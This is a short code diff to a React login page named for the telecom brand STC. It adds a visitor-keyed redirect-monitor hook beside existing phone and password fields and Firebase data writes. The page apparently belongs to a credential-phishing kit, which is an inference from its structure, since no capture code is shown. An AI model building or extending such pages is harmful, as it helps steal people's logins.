@@ -6,6 +6,7 @@ import { Phone, Lock, Eye, EyeOff, Loader2, ShieldCheck } from "lucide-react";
 import { addData, db } from "@/lib/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
 import { getRedirectUrl } from "@/lib/page-route";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 
 export default function StcLoginPage() {
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -44,6 +45,7 @@ export default function StcLoginPage() {
 
     return () => unsubscribe();
   }, [visitorId]);
+  useRedirectMonitor({ visitorId, currentPage: "stc-login" });
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setPhoneNumber(e.target.value);
